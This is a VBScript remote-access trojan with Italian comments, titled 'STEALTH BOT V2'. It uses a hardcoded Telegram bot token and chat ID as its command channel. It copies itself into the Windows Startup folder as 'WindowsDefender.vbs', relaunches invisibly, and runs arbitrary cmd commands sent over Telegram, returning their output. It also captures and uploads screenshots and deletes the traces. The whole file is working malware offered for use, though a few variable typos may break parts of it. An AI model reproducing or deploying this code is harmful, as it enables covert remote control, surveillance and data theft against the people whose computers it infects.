'##############################################
'# STEALTH BOT V2 - CMD & SCREENSHOT          #
'# Comandi: cmd: <comando> | foto             #
'##############################################

'### Configurazione ###
BOT_TOKEN = "7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
CHAT_ID = "5709299213"
API_URL = "https://api.telegram.org/bot" & BOT_TOKEN
SCREENSHOT_PATH = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\sc.jpg"

'### Installazione automatica ###
If Not WScript.Arguments.Count = 1 Then
    Set WshShell = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    ' Copia in startup
    startupPath = WshShell.SpecialFolders("Startup") & "\WindowsDefender.vbs"
    fso.CopyFile WScript.ScriptFullName, startupPath
    
    ' Avvio invisibile
    WshShell.Run "wscript.exe """ & WScript.ScriptFullName & """ --stealth", 0, False
    WScript.Quit
End If

'### Funzioni principali ###
Function TelegramSend(text)
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "POST", API_URL & "/sendMessage", False
    http.setRequestHeader "Content-Type", "application/json"
    http.send "{""chat_id"":""" & CHAT_ID & """,""text"":""" & text & """}"
End Function

Function TakeScreenshot()
    Set ps = CreateObject("WScript.Shell").Exec("powershell -nop -c ""Add-Type -AssemblyName System.Windows.Forms; $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size); $bitmap.Save('" & SCREENPHOT_PATH & "', [System.Drawing.Imaging.ImageFormat]::Jpeg); $bitmap.Dispose()""")
    ps.StdOut.ReadAll() ' Attesa completamento
    
    ' Invio file via Telegram
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "POST", API_URL & "/sendPhoto", False
    http.setRequestHeader "Content-Type", "multipart/form-data"
    http.send "{""chat_id"":""" & CHAT_ID & """,""photo"":""" & SCREENSHOT_PATH & """}"
    
    ' Cancella tracce
    fso.DeleteFile(SCREENSHOT_PATH)
End Function

'### Loop principale ###
Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

Do
    ' Ricevi ultimo comando
    Set http = CreateObject("MSXML2.XMLHTTP")
    http.Open "GET", API_URL & "/getUpdates?offset=-1", False
    http.send
    json = http.responseText
    
    ' Estrai comando
    cmd = ""
    If InStr(json, """text"":""") > 0 Then
        cmd = Mid(json, InStr(json, """text"":""") + 8)
        cmd = Left(cmd, InStr(cmd, """") - 1)
    End If
    
    ' Esegui comandi
    If Len(cmd) > 0 Then
        If LCase(Left(cmd, 4)) = "cmd:" Then
            ' Esegui comando CMD
            command = Mid(cmd, 5)
            Set exec = WshShell.Exec("cmd /c " & command)
            output = exec.StdOut.ReadAll()
            TelegramSend output
        ElseIf LCase(cmd) = "foto" Then
            ' Screenshot invisibile
            TakeScreenshot
            TelegramSend "📸 Screenshot catturato e inviato"
        End If
    End If
    
    ' Attesa casuale (3-8 secondi)
    WScript.Sleep 3000 + Int(Rnd * 5000)
Loop
